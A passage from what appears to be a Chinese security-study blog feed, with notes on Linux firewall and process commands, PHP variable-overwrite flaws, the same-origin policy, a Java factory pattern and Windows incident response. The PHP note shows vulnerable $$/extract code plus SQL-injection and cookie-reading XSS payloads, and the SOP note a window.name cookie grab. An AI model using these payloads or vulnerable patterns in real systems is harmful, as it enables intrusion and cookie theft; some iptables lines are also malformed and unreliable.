class="comment">#插入到表的最上方</span></span><br><span class="line">	-A : append <span class="comment">#插入到表的最下方</span></span><br><span class="line">	<span class="comment">#可加入数字表示添加到第几条</span></span><br><span class="line">	-n : <span class="comment">#以数字形式显示</span></span><br><span class="line">	-L ： <span class="comment">#列出所有规则</span></span><br><span class="line">	-v ： <span class="comment">#详细信息</span></span><br><span class="line">	--dport</span><br><span class="line">	--sport</span><br><span class="line">	—line-numbers <span class="comment">#显示规则序号</span></span><br><span class="line">	-i : <span class="comment">#指定入口</span></span><br><span class="line">	-o : <span class="comment">#指定出口</span></span><br><span class="line">	-m mutiport --dports 22,80,443 <span class="comment">#多端口匹配</span></span><br><span class="line">	--dports <span class="comment">#指定多个目标端口</span></span><br><span class="line">iptables -t filter -A input -s ens33 --dport 22 -I -j reject -p tcp</span><br><span class="line">iptables -P input ACCEPT</span><br><span class="line">	--sports <span class="comment">#指定多个源端口</span></span><br><span class="line">	-j <span class="comment">#允许还是拒绝</span></span><br><span class="line">	-N <span class="comment">#新建一个链</span></span><br><span class="line">	-s <span class="comment">#源地址</span></span><br><span class="line">	-d <span class="comment">#目标地址</span></span><br><span class="line">	-vv <span class="comment">#显示更详细的信息</span></span><br><span class="line">	-F <span class="comment"># 清空所有规则</span></span><br><span class="line">	-m <span class="comment">#后接模块名 ,使用扩展iptables</span></span><br><span class="line">	-m iprange --src-range 172.16.11.13-171.16.11.100</span><br><span class="line">	-m iprange --dist-range <span class="comment">#匹配ip地址范围</span></span><br><span class="line">	-m string --algo mb --string <span class="string">&quot;gxa&quot;</span> <span class="comment">#匹配字符串</span></span><br><span class="line">	-m connlimit-upto</span><br><span class="line">	-m connlimit-above </span><br><span class="line">	-m state --<span class="built_in">stat</span> NEW|ESTABLISHED <span class="comment">#状态检测</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>NAT表</strong></p>
<p>四链</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">postrouting</span><br><span class="line">prerouting</span><br><span class="line">output</span><br><span class="line">input</span><br></pre></td></tr></table></figure>

<p>iptables -t nat -A POSTROUTING -p tcp -o eth0 -s 192.168.10.23&#x2F;24 -j SNAT —to-source 12.34.54.45&#x2F;24</p>
<p>-j SNAT|DNAT &#x2F;&#x2F;端口复用与端口映射</p>
<h1 id="firewall-cmd"><a href="#firewall-cmd" class="headerlink" title="firewall-cmd"></a>firewall-cmd</h1><p>firewall-cmd —version</p>
<p>firewall-cmd —state</p>
<p>firewall-cmd —zone&#x3D;public —list-ports &#x2F;&#x2F;查看已打开的端口</p>
<p>firewall-cmd —zone&#x3D;public —add-port&#x3D;80&#x2F;tcp —permanent &#x2F;&#x2F;开放tcp80端口并永久生效</p>
<p>firewall-cmd —reload &#x2F;&#x2F;开放了端口后，重新加载配置</p>
<p>firewall-cmd —zone&#x3D;puublic —remove—port&#x3D;80&#x2F;tcp —permanent &#x2F;&#x2F;关闭80端口</p>
<p>firewall-cmd —get-zones &#x2F;&#x2F;获取所有的可用区域</p>
<p>也可以直接修改配置文件</p>
<p>&#x2F;etc&#x2F;firewall&#x2F;zones&#x2F;public.xml</p>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><p>通配符：匹配文件名</p>
<p>正则表达式：匹配文件内容</p>
<p><strong>grep</strong></p>
<p>标准正则</p>
<p>逐行匹配，匹配的显示整行</p>
<p>-i 忽略大小写</p>
<p>-o 仅显示匹配字符</p>
<p>-v 反向显示</p>
<p>-A  3    after &#x2F;&#x2F;显示匹配项及之后几行</p>
<p>-B 4     before &#x2F;&#x2F;显示匹配项前面的几行</p>
<p>-C 4    context &#x2F;&#x2F;显示前后几行</p>
<p>? &#x2F;&#x2F;0次或者1次</p>
<p>+</p>
<p>{}</p>
<p>&gt; &#x2F;&#x2F;词尾</p>
<p>&lt; &#x2F;&#x2F;词首</p>
<p>扩展正则</p>
<p>grep -E</p>
<p>不需要转义，可加 | 等</p>
<p>sort -t: -k3 -r -n a.txt<br>-t 指定分隔符</p>
<p>-k 指定字段</p>
<p>-r 指定为逆序</p>
<p>-n 指定按数字排序</p>
<h1 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h1><p>进程类型</p>
<p>守护进程：开机后启动并一直运行再后台得进程</p>
<p>瞬时进程：命令执行完就结束进程</p>
<p>用户进程</p>
<p>进程优先级</p>
<p>1-99 实时优先级</p>
<p>100-139 静态优先级 &#x2F;&#x2F;值越大优先级越高</p>
<p>进程的状态</p>
<p>running 运行态 R</p>
<p>ready 就绪</p>
<p>sleep 睡眠态：S可中断进程，d不可中断进程</p>
<p>stopped 停止态</p>
<p>zombie 僵死态 父进程挂掉了，子进程的状态</p>
<p>session leader</p>
<ul>
<li>前台进程</li>
</ul>
<p>l 多线程进程</p>
<p>ps -aux</p>
<p>ps -ef</p>
<p>pstree</p>
<p>-a</p>
<p>-u</p>
<p>-x</p>
<p>pgrep -u 0 &#x2F;&#x2F;根据用户显示进程</p>
<p>pidof httpd &#x2F;&#x2F;与命令相关的所有进程号</p>
<p>pkill pid &#x2F;&#x2F;杀进程</p>
<p>uptime</p>
<p>vmstat</p>
<p>procs</p>
<p>kill -singal</p>
<p>singalup 1 &#x2F;&#x2F;重读配置文件</p>
<p>singalnt 2 &#x2F;&#x2F;变比进程</p>
<p>sig’kill 9 &#x2F;&#x2F;强杀</p>
<p>sigterm 15 &#x2F;&#x2F;正常结束</p>
<p>sigcont 18 &#x2F;&#x2F;继续执行</p>
<p>sigstop 19 &#x2F;&#x2F;暂停执行</p>
<p>killall process_name &#x2F;&#x2F;杀死进程</p>
<p>nohup &#x2F;&#x2F;脱离当前中断</p>
<p>&amp; &#x2F;&#x2F;调用到后台执行</p>
<p>定时任务</p>
<p>一次执行</p>
<p>at option</p>
<p>at -l &#x2F;&#x2F;查看任务</p>
<p>at -f &#x2F;path&#x2F;to&#x2F;file</p>
<p>atrm 1 &#x2F;&#x2F;删除定时任务</p>
<p>at 4am tomorrow</p>
<p>周期执行</p>
<p>crontab</p>
<p>&#x2F;etc&#x2F;crontab</p>
<p>crontab -e &#x2F;&#x2F;编辑设置定时任务</p>
<p>crontab -l &#x2F;&#x2F;列出任务</p>
<p>crontab -r  &#x2F;&#x2F;移除所有任务</p>
<p>crontab -u &#x2F;&#x2F;指定用户</p>
<p><code>/var/spool/cron/username</code> &#x2F;&#x2F;定时任务都在这儿</p>
<p>***** 分钟-小时-日-月-星期</p>
<p><img src="/Untitled%201.png"></p>
<p><img src="/Untitled%202.png"></p>
<p><img src="/Untitled%203.png"></p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>变量覆盖</title>
    <url>/archives/c6852300.html</url>
    <content><![CDATA[<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>使用自定义的参数值去覆盖替换程序原有的变量值。</p>
<p>涉及函数：extract parse_str import_request_variables——php5.4版本以上已被弃用 $$</p>
<p><strong>extract函数</strong></p>
<p>该函数将一个数组注册成变量，每一对键值对对应一组变量。</p>
<p><code>int extract (array,options,prefix)</code></p>
<p>第一个参数为一个数组，为被操作量，第二个参数限定了变量注册的规则。当第二个参数为</p>
<p><a href="%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%2075f71fb7b52d48ac8f1fee5971481ad6/%E7%AC%AC%E4%BA%8C%E4%B8%AA%E5%8F%82%E6%95%B0%20f6faafce79bd4e4483c243fcc670bbeb.csv">第二个参数</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phpecho &quot;&lt;meta http-equiv=&#x27;content-type&#x27; content=&#x27;text/html;charset=utf-8&#x27;&gt;&quot;;//extract$a=10;echo &#x27;覆盖前$a：&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;$o=array(&#x27;a&#x27;=&gt;20,&#x27;b&#x27;=&gt;30);extract($o);echo &#x27;覆盖后$a：&#x27;.$a.&#x27;&lt;/br&gt;&#x27;;echo &#x27;新注册变量$b：&#x27;.$b.&#x27;&lt;/br&gt;&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>parse_str函数</strong></p>
<p>解析字符串注册变量，在注册变量之前不会验证它是否已经存在，所以会直接覆盖到之前的变量。</p>
<p><code>void parse_str(string,array)</code></p>
<p>第一个参数是要注册的字符串，形式为<code>a=1</code> 会被注册为<code>$a=1</code> ,当第二个参数存在的时候，该变量会被注册为一个数组。如果这个数组原本就存在相同的键，则会覆盖掉原有的键</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//parse_str//注册变量$d=111;echo &#x27;parse_str覆盖前$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;parse_str(&#x27;d=666&#x27;);echo &#x27;parse_str覆盖后$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;//注册数组parse_str(&#x27;d=8888&#x27;,$g);echo &#x27;parse_str注册数组覆盖后$d：&#x27;.$d.&#x27;&lt;/br&gt;&#x27;;var_dump(&#x27;parse_str覆盖后$g：&#x27;.$g.&#x27;&lt;/br&gt;&#x27;);echo $g[&#x27;d&#x27;];</span><br></pre></td></tr></table></figure>

<p><strong>import_request_variables函数</strong></p>
<p>报get、post、cookie中的参数注册为变量，用在在register_globals被禁止的时候，因为存在安全风险，现在已经不建议使用。</p>
<p><code>bool import_request_variables(types,prefix)</code></p>
<p>types GPC</p>
<p>prefix 前缀</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$h=11;//import_request_variables(&#x27;GP&#x27;); //已启用echo $h;</span><br></pre></td></tr></table></figure>

<p><strong>$$变量覆盖</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php$a=10;echo $a;echo &#x27;&lt;/br&gt;&#x27;;foreach ($_POST as $key=&gt;$value)&#123;    $$key=$value;    echo $a;&#125;</span><br></pre></td></tr></table></figure>

<p>通过变量覆盖，我们可以直接覆盖所有之前的变量，比如说存在一天sql语句这么写的</p>
<p><code>select * from &#123;$test&#125; where name=&#39;armandhe&#39;</code></p>
<p>那么可以覆盖$test，传入</p>
<p><code>?test=mysql.user limit 1%23</code></p>
<p>这样就形成了sql注入</p>
<p>也可以直接注入xss</p>
<p>如果后台存在</p>
<p><code>echo $a</code></p>
<p>覆盖</p>
<p><code>?a=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote>
<p>使用原始变量，$_GET等，不要玩花的。</p>
</blockquote>
<blockquote>
<p>注册变量前，先验证变量是否存在。</p>
</blockquote>
<blockquote>
<p>同一加前缀</p>
</blockquote>
<blockquote>
<p>自行定义的变量一定要记住初始化， 不然即便注册变量的代码在最前面也会覆盖这些未初始化的变量。</p>
</blockquote>
<p>关闭 register_globals</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title>同源策略———SOP</title>
    <url>/archives/446c8683.html</url>
    <content><![CDATA[<h1 id="同源策略———SOP"><a href="#同源策略———SOP" class="headerlink" title="同源策略———SOP"></a>同源策略———SOP</h1><p>该笔记参考以下文章</p>
<p><a href="https://www.jianshu.com/p/beb059c43a8b">前端必备HTTP技能之同源策略详解</a></p>
<h1 id="同源策略概述"><a href="#同源策略概述" class="headerlink" title="同源策略概述"></a>同源策略概述</h1><p>同源策略规定了两个页面之间互相访问数据的规则。即只有在同一个源下的页面才能互相访问彼此的页面数据。该机制可以阻止某个页面中的恶意脚本对其他页面的敏感信息的访问。</p>
<p>同源策略对于使用cookie保存session信息来实现身份认证的浏览器来说具有重大意义</p>
<p>源是通过<code>协议、主机、端口</code>来定义的，只有这三者保持一致的时候猜被认为是同源的，不同源的页面之间是不能互相访问的</p>
<h1 id="如何规避同源策略—-跨域通信手段"><a href="#如何规避同源策略—-跨域通信手段" class="headerlink" title="如何规避同源策略—-跨域通信手段"></a>如何规避同源策略—-跨域通信手段</h1><p><a href="http://codercto.com/a/29007.html">浅谈sop、cors和csp</a></p>
<p>我们的网站如果有两个主机，那么因为同源策略的限制他们之间就不能互相交换数据，这明显是不符合要求的，那么怎么规避掉同源策略呢</p>
<h2 id="使用document-domain"><a href="#使用document-domain" class="headerlink" title="使用document.domain"></a>使用document.domain</h2><p>将两个主机的源设置为同一个，此时他们之间就可以互相访问资源了</p>
<p>这个方法有一个问题就是，我们在修改源的时候，可能把端口号修改为null，此时两个网站就不同源了。只有cookie和iframe共享可通过该方式设置，不能共享localstorage和indexdb</p>
<h2 id="使用window-name"><a href="#使用window-name" class="headerlink" title="使用window.name"></a>使用window.name</h2><p>window.name中的值不受同源策略的限制，我们可以在注入的语句中将我们想要的数据赋值给window.name，然后再获取，如：</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">name</span>=<span class="variable language_">document</span>.<span class="property">cookie</span> #这样就可以绕过同源策略获取当前页面的cookie</span><br></pre></td></tr></table></figure>

<p>在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的，每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的，并不会因新页面的载入而进行重置。这个属性的最大特点是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页可以读取它。</p>
<h2 id="CORS-跨域资源访问"><a href="#CORS-跨域资源访问" class="headerlink" title="CORS 跨域资源访问"></a>CORS 跨域资源访问</h2><p>允许浏览器向跨源<a href="http://www.codercto.com/category/server.html">服务器</a>发XMLHttpRequest请求，突破了ajax只能同源的限制，并且和ajax代码一样，关键在服务器的cors配置。该策略限制的是浏览器对目的地址的读取，即在浏览器发出请求后，目的地址的资源已经成功被浏览器加载了，但是因为cors的存在所以浏览器会判断下列字段，确定发出请求的网页是否有加载该资源的权限。</p>
<p>**Access-control-allow-origin：**设置哪写源的网页可以访问本网页的资源</p>
<p><strong>Access-Control-ALlow-Method:允许的请求方法</strong></p>
<p><strong>Access-Control-Expose-Headers:时候允许返回自定义的heep头字段</strong></p>
<p><strong>Access-Control-Allow-Credentials:是否允许发cookie</strong></p>
<p><strong>cors分为简单请求与非简单请求</strong></p>
<p>简单请求</p>
<p>方法：head\get\post</p>
<p>http头：acao必选 aceh acac可选</p>
<p>非简单请求</p>
<p>先进行预检请求options</p>
<p>http头：acao acae 必选 acrh可选</p>
<h2 id="跨文档通信"><a href="#跨文档通信" class="headerlink" title="跨文档通信"></a>跨文档通信</h2><p>这种方式允许一个页面的脚本发送文本信息到另一个页面的脚本中，不管脚本是否跨域。在一个window对象上调用<code>postMessage()</code>会异步的触发window上的<code>onmessage</code>事件，然后触发定义好的事件处理方法。一个页面上的脚本仍然不能直接访问另外一个页面上的方法或者变量，但是他们可以安全的通过消息传递技术交流。</p>
<h2 id="Websocket"><a href="#Websocket" class="headerlink" title="Websocket"></a>Websocket</h2><p>websocket是为了解决http协议的一些问题而产生的，相比于http协议，websocket是一种全双工的协议，不像http协议只支持简单的请求响应单项链接，websocket协议中服务端可以主动向客户端推送消息。同时websocket协议不受同源策略的限制，使用的端口号也是80和443，协议标志位ws 和wss。数据格式更加轻量化，额外开支小，更好的二进制支持。但在握手阶段还是采用的http协议。</p>
<p>现代浏览器允许脚本直连一个WebSocket地址而不管同源策略。然而，使用WebSocket URI的时候，在请求中插入<code>Origin</code>头就可以标识脚本请求的源。为了确保跨站安全，WebSocket服务器必须根据允许接受请求的白名单中的源列表比较头数据</p>
<blockquote>
<p>既然是在请求头中添加的策略，那么是否存在被篡改的风险</p>
</blockquote>
<p><strong>拓展：与服务端通信的方法—-ajax轮询、long polling 长轮询、websocket</strong></p>
<p>ajax:定时向服务端发送请求</p>
<p>long polling:客户端与服务器保持一个长连接，等到服务端有消息返回，断开。再重新链接</p>
<p>web socket ：客户端发起http请求，告诉服务器进行websocket通信，并告知版本，服务器确认版本、协议，后开始进行websocket通信。</p>
<h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>ajax受同源策略的限制不允许跨域访问资源，但蕾西与script\a\img这类带有src属性的标签却可以跨域调用js脚本，我们利用这个特性，返回一个js函数，在src属性中进行调用，从而实现了跨域。jsonp只支持get方法，只解决了跨域请求，不能解决不同域的页面之间的js调用问题。</p>
<h2 id="片段"><a href="#片段" class="headerlink" title="#片段"></a>#片段</h2><p>利用锚点的的特性，父窗口可以把数据写到子窗口url的锚点后面发送给子窗口。</p>
<h2 id="不受同源策略限制的标签—-jsonp"><a href="#不受同源策略限制的标签—-jsonp" class="headerlink" title="不受同源策略限制的标签—-jsonp"></a>不受同源策略限制的标签—-jsonp</h2><script>、<img>、<link>、<iframe>等带src属性的标签可以从外域加载资源，但不可以读资源

页面内加载的JS文件本身放在哪里并不重要，只要它被谁加载了，就和谁同源。

## CSP———-内容安全策略

允许哪些资源的那些来源加载，该策略限制请求是否发出，浏览器在发出请求前，先读取当前页面的csp，对比目的地址是否符合scp策略，如果符合才发起跨域请求。

通过`Content-Security-Policy:policy`]]></content>
      <categories>
        <category>安全技术</category>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
        <tag>同源策略</tag>
        <tag>SOP</tag>
      </tags>
  </entry>
  <entry>
    <title>工厂模式</title>
    <url>/archives/54788f73.html</url>
    <content><![CDATA[<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><p>工厂模式是Java中最常用的设计模式之一，这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。</p>
<p>个人认为工厂模式就是为了隐藏对象的具体实现，提供一个接口给用户使用，这个接口就是工厂，就想我们买一件产品，我们可以直接向工厂批发，我们只需要提供给厂家产品的名字，厂家就提供给我们可以完成我们需求的对应的产品。这就是工厂模式，我们并不需要知道这个产品的原材料是什么、是怎么做出来的。</p>
<p>下面的图诠释了工厂模式的工作流程</p>
<p><img src="/archives/54788f73/Untitled.png" alt="Untitled"></p>
<h3 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤 1"></a><strong>步骤 1</strong></h3><p>创建一个接口:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Shape.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">   <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤-2"><a href="#步骤-2" class="headerlink" title="步骤 2"></a><strong>步骤 2</strong></h3><p>创建实现接口的实体类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Rectangle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Rectangle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Square.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Square::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Circle.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">implements</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">()</span> &#123;</span><br><span class="line">      System.out.println(<span class="string">&quot;Inside Circle::draw() method.&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤-3"><a href="#步骤-3" class="headerlink" title="步骤 3"></a><strong>步骤 3</strong></h3><p>创建一个工厂，生成基于给定信息的实体类的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ShapeFactory.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShapeFactory</span> &#123;</span><br><span class="line">    </span><br><span class="line">   <span class="comment">//使用 getShape 方法获取形状类型的对象</span></span><br><span class="line">   <span class="keyword">public</span> Shape <span class="title function_">getShape</span><span class="params">(String shapeType)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(shapeType == <span class="literal">null</span>)&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">      &#125;        </span><br><span class="line">      <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;CIRCLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Circle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;RECTANGLE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(shapeType.equalsIgnoreCase(<span class="string">&quot;SQUARE&quot;</span>))&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Square</span>();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤-4"><a href="#步骤-4" class="headerlink" title="步骤 4"></a><strong>步骤 4</strong></h3><p>使用该工厂，通过传递类型信息来获取实体类的对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FactoryPatternDemo.java</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FactoryPatternDemo</span> &#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">      <span class="type">ShapeFactory</span> <span class="variable">shapeFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShapeFactory</span>();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Circle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape1</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;CIRCLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Circle 的 draw 方法</span></span><br><span class="line">      shape1.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Rectangle 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape2</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;RECTANGLE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Rectangle 的 draw 方法</span></span><br><span class="line">      shape2.draw();</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//获取 Square 的对象，并调用它的 draw 方法</span></span><br><span class="line">      <span class="type">Shape</span> <span class="variable">shape3</span> <span class="operator">=</span> shapeFactory.getShape(<span class="string">&quot;SQUARE&quot;</span>);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">//调用 Square 的 draw 方法</span></span><br><span class="line">      shape3.draw();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="步骤-5"><a href="#步骤-5" class="headerlink" title="步骤 5"></a><strong>步骤 5</strong></h3><p>执行程序，输出结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Inside Circle::draw() method.</span><br><span class="line">Inside Rectangle::draw() method.</span><br><span class="line">Inside Square::draw() method.</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全技术</category>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>工厂模式</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应</title>
    <url>/archives/587e8742.html</url>
    <content><![CDATA[<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="入侵检测"><a href="#入侵检测" class="headerlink" title="入侵检测"></a>入侵检测</h2><h3 id="系统账户相关"><a href="#系统账户相关" class="headerlink" title="系统账户相关"></a>系统账户相关</h3><ul>
<li>查看用户 net user</li>
<li>lusrmgr.exe 无法查看通过注册表方式增加的用户</li>
<li>注册表查看 HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\</li>
<li>打开事件监听器查看登录日志 eventvwr.msc</li>
</ul>
<h3 id="进程、端口相关"><a href="#进程、端口相关" class="headerlink" title="进程、端口相关"></a>进程、端口相关</h3><ul>
<li>netstat -ano</li>
<li>netstat -ano | findstr estab</li>
<li>netstat -rn 查看路由</li>
<li>msinfo32 查看系统信息</li>
<li>tasklist 显示进程</li>
<li>tasklist &#x2F;f &#x2F;pid 123 &#x2F;t 杀死进程</li>
<li>tastlist &#x2F;f &#x2F;im explorer.exe &#x2F;t 杀死进程</li>
<li>查看进程正在使用的文件  wmic       process</li>
<li>tasklist &#x2F;svc显示进程 pid 服务</li>
<li>netsh firewall show all 查看防火墙相关</li>
</ul>
<h2 id="启动项、计划任务、服务"><a href="#启动项、计划任务、服务" class="headerlink" title="启动项、计划任务、服务"></a>启动项、计划任务、服务</h2><ul>
<li>C:\Users\xxxx\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup 开机启动项路径</li>
<li>mscofig 系统配置的启动项</li>
<li>HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce 注册表启动项</li>
<li>gpedit.msc 查看启动脚本</li>
<li>services.msc 查看服务</li>
<li>systeminfo 查看系统信息</li>
<li>%userprofile%\recent 最近打开的文件</li>
<li>查看回收站，浏览器下载记录，历史记录 查看修改时间在创建时间之前的文件</li>
</ul>
<h2 id="内存相关"><a href="#内存相关" class="headerlink" title="内存相关"></a>内存相关</h2><ul>
<li>NotMyFault64.exe &#x2F;crash 生成的文件在%systemroot%\memory.dmp 内存转储</li>
</ul>
<h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><h2 id="日志记录"><a href="#日志记录" class="headerlink" title="日志记录"></a>日志记录</h2><p><code>window   %systemroot%\system32\winevt\logs\</code></p>
<h1 id="快捷指令"><a href="#快捷指令" class="headerlink" title="快捷指令"></a>快捷指令</h1><h1 id="系统相关"><a href="#系统相关" class="headerlink" title="系统相关"></a>系统相关</h1><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> compmgmt.<span class="property">msc</span>---计算机管理</span><br><span class="line">【包括 计划任务、事件查看器、共享文件夹、本地用户和组、设备管理器、磁盘管理、服务、<span class="variable constant_">WMI</span>】</span><br><span class="line"><span class="number">2.</span> devmgmt.<span class="property">msc</span>----设备管理器 【包含于compmgmt】</span><br><span class="line"><span class="number">3.</span> lusrmgr.<span class="property">msc</span>----本地用户和组【包含于compmgmt】<span class="number">4.</span> perfmon.<span class="property">msc</span>----计算机性能监测程序 【包含于compmgmt】</span><br><span class="line"><span class="number">5.</span> diskmgmt.<span class="property">msc</span>---磁盘管理实用程序 【包含于compmgmt】</span><br><span class="line"><span class="number">6.</span> fsmgmt.<span class="property">msc</span>-----共享文件夹管理器 【包含于compmgmt】</span><br><span class="line"><span class="number">7.</span> services.<span class="property">msc</span>---本地服务设置    【包含于compmgmt】</span><br><span class="line"><span class="number">8.</span> eventvwr.<span class="property">msc</span>---事件查看器     【包含于compmgmt】</span><br><span class="line"><span class="number">9.</span> wmimgmt.<span class="property">msc</span>----打开windows管理体系结构(<span class="variable constant_">WMI</span>) 【包含于compmgmt】</span><br><span class="line"><span class="number">10.</span> gpedit.<span class="property">msc</span>----组策略</span><br><span class="line"><span class="number">11.</span> regedt32------注册表编辑器    【与 regedit 类似】</span><br><span class="line"><span class="number">12.</span> <span class="title class_">Msconfig</span>.<span class="property">exe</span>--系统配置实用程序 【包括引导、服务、启动项和工具】</span><br><span class="line"><span class="number">13.</span> rsop.<span class="property">msc</span>------组策略结果集 </span><br><span class="line"><span class="number">14.</span> regedit.<span class="property">exe</span>---注册表 </span><br><span class="line"><span class="number">15.</span> dcomcnfg------打开系统组件服务 【包括 组件服务、事件查看器、服务】</span><br><span class="line"><span 